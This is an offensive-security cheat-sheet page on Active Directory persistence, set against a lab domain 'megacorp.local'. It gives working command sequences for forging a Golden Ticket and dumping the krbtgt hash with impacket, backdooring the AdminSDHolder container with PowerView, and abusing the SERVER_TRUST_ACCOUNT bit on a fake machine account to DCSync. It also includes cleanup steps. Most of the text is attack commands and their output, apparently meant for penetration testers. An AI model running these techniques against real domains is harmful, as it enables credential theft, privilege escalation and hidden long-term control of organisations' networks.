# Persistence




## Golden Ticket



### impacket

```
$ ticketer.py -nthash 00ff00ff00ff00ff00ff00ff00ff00ff -domain-sid S-1-5-21-4266912945-3985045794-2943778634 -domain megacorp.local snovvcrash
$ export KRB5CCNAME=`pwd`/snovvcrash.ccache
$ psexec.py megacorp.local/snovvcrash@DC01.megacorp.local -k -no-pass
$ secretsdump.py megacorp.local/snovvcrash@DC01.megacorp.local -dc-ip 10.10.13.37 -just-dc-user 'MEGACORP\krbtgt' -k -no-pass
```




## AdminSDHolder Modification

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
* [https://attack.stealthbits.com/adminsdholder-modification-ad-persistence](https://attack.stealthbits.com/adminsdholder-modification-ad-persistence)



### Create a Backdoor

Add a new domain user or grant an existent user `GenericAll` permissions for the `AdminSDHolder` container:

```
PowerView3 > Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=megacorp,DC=local" -TargetDomain megacorp.local -PrincipalIdentity snovvcrash -PrincipalDomain megacorp.local -Rights All -Verbose
```

Check that granting `AdminSDHolder` permissions was successfull (may take 60+ minutes for the security ACLs to get updated for that user):

```
PowerView3 > Get-DomainUser snovvcrash | select objectsid
S-1-5-21-2284550090-1208917427-1204316795-9824

PowerView3 > Get-DomainObjectAcl -Identity "CN=AdminSDHolder,CN=System,DC=megacorp,DC=local" -Domain megacorp.local -ResolveGUIDs | ? {$_.SecurityIdentifier -eq "S-1-5-21-2284550090-1208917427-1204316795-9824"}

AceType               : AccessAllowed
ObjectDN              : CN=AdminSDHolder,CN=System,DC=megacorp,DC=local
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             :
InheritanceFlags      : None
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-2284550090-1208917427-1204316795-9824
AccessMask            : 983551
AuditFlags            : None
AceFlags              : None
AceQualifier          : AccessAllowed
```

Now you can add yourself (the "snovvcrash" user) to the Domain Admins group any time and do stuff (actually adding the user to Domain Admins every time is not necessary, as the `AdminCount` attribute will stay `1` anyways after adding the backdoor user to a protected group for the first time):

```
PowerView3 > Add-DomainGroupMember -Identity "Domain Admins" -Members snovvcrash
PowerView3 > Get-DomainObjectAcl -Identity "Domain Admins" -Domain megacorp.local -ResolveGUIDs | ? {$_.SecurityIdentifier -eq "S-1-5-21-2284550090-1208917427-1204316795-9824"}

AceType               : AccessAllowed
ObjectDN              : CN=Domain Admins,CN=Users,DC=megacorp,DC=local
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-2284550090-1208917427-1204316795-512
InheritanceFlags      : None
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-2284550090-1208917427-1204316795-9824
AccessMask            : 983551
AuditFlags            : None
AceFlags              : None
AceQualifier          : AccessAllowed

PowerView3 > Remove-DomainGroupMember -Identity "Domain Admins" -Members snovvcrash
PowerView3 > Get-DomainUser snovvcrash | select admincount

admincount
----------
         1
```



### Remove the Backdoor

* [https://www.reddefenseglobal.com/blog/microsoft-domain-attack-techniques/admincount/](https://www.reddefenseglobal.com/blog/microsoft-domain-attack-techniques/admincount/)
* [https://www.ucunleashed.com/1621](https://www.ucunleashed.com/1621)

Disable or remove the account (if a new user was created):

```
PS > net user snovvcrash /domain /active:no
PS > net user snovvcrash /domain /del
```

Remove user AdminSDHolder container via GUI (ADUC, dsa.msc).

Clear the `AdminCount` attribute (will be resetted if the user is still in the `AdminSDHolder` container):

```
PowerView3 > Set-DomainObject -Identity snovvcrash -Domain megacorp.local -Clear admincount -Verbose
Or
PS > Get-ADUser snovvcrash | Set-ADObject -Clear admincount
```

Fix the inheritance rules:

```
PS > [bool]$isProtected = $false
PS > [bool]$PreserveInheritance = $true
PS > [string]$dn = (Get-ADUser snovvcrash).DistinguishedName
PS > $user = [ADSI]"LDAP://$dn"
PS > $acl = $user.objectSecurity
PS > $acl.AreAccessRulesProtected
True  # procced if True
PS > $acl.SetAccessRuleProtection($isProtected, $PreserveInheritance)
PS > $inherited = $acl.AreAccessRulesProtected
PS > $user.commitchanges()
PS > $acl.AreAccessRulesProtected
False
```




## SERVER_TRUST_ACCOUNT

* [https://stealthbits.com/blog/server-untrust-account/](https://stealthbits.com/blog/server-untrust-account/)

When DA is owned (or any other account with `DS-Install-Replica` permission), you can create a fake machine account (or use an existing real machine account), set `SERVER_TRUST_ACCOUNT` bit for it and perform DCSync on behalf of this account to regain domain dominance.

1\. Create a fake machine account:

```
Powermad > New-MachineAccount -MachineAccount fakemachine -Password $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force) -Verbose
PowerView3 > Get-DomainComputer fakemachine | select name,primarygroupid,useraccountcontrol

name        primarygroupid        useraccountcontrol
----        --------------        ------------------
fakemachine            515 WORKSTATION_TRUST_ACCOUNT
```

2\. Set the `SERVER_TRUST_ACCOUNT` bit:

```
PowerView3 > Set-DomainObject fakemachine -Set @{useraccountcontrol=8192}
PowerView3 > Get-DomainComputer fakemachine | select name,primarygroupid,useraccountcontrol

name        primarygroupid   useraccountcontrol
----        --------------   ------------------
fakemachine            516 SERVER_TRUST_ACCOUNT
```

3\. Perform DCSync:

```
$ secretsdump.py MEGACORP/'fakemachine$:Passw0rd!'@DC1.megacorp.local -dc-ip 192.168.2.11 -just-dc-user 'MEGACORP\krbtgt'
```

4\. Cleanup:

```
PowerView3 > Set-DomainObject fakemachine -Set @{useraccountcontrol=4096}
Or
Powermad > Remove-MachineAccount -MachineAccount fakemachine
```
